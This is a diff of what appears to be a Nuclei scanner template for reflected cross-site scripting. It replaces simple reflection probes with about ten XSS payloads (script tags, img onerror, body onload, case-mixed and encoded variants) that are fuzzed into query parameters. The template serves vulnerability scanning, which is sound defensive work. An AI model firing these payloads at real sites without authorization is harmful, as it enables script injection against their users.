@@ -1,36 +1,34 @@
 id: reflected-xss
 
 info:
-  name: Reflected Cross-Site Scripting
-  author: pdteam,0xKayala,AmirHossein Raeisi
+  name: Reflected Cross Site Scripting
+  author: pdteam
   severity: medium
-  metadata:
-    max-request: 1
   tags: xss,rxss,dast
 
 variables:
   first: "{{rand_int(10000, 99999)}}"
 
 http:
-  - pre-condition:
-      - type: dsl
-        dsl:
-          - 'method == "GET"'
+  - method: GET
+    path:
+      - "{{BaseURL}}"
 
     payloads:
       reflection:
-        - "'\"><{{first}}>"
-        - "'><{{first}}>"
-        - "\"><{{first}}>"
+        - "'\"><{{first}}"
+        - "<img src=x onerror=alert({{first}})>"
+        - "<script>alert({{first}})</script>"
+        - "'><ScRiPt>alert({{first}})</sCrIpT>"
+        - "</script><ScRiPt>alert({{first}})</sCrIpT>"
+        - "</script><script>alert({{first}})</script>"
+        - "<body onload=alert({{first}})>"
+        - "<marquee><img src=x onerror=confirm({{first}})></marquee>"
+        - "'><img%20src=xxx:x%20\x20onerror=javascript:alert({{first}})>"
+        - "\u0022\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e"
 
     fuzzing:
       - part: query
-        type: postfix
-        mode: single
-        fuzz:
-          - "{{reflection}}"
-
-      - part: path
         type: postfix
         mode: single
         fuzz:
@@ -48,4 +46,3 @@ http:
         part: header
         words:
           - "text/html"
-# digest: 4a0a00473045022100b946e6f2777bc795532ee437c3d501e3a0dda1c5bb31838576a7ae90d9862af102203bce6702443ca30f8c1fd96869c24c442f0d920e8b2db0bab68413c30b9756c9:922c64590222798bb761d5b6d8e72950
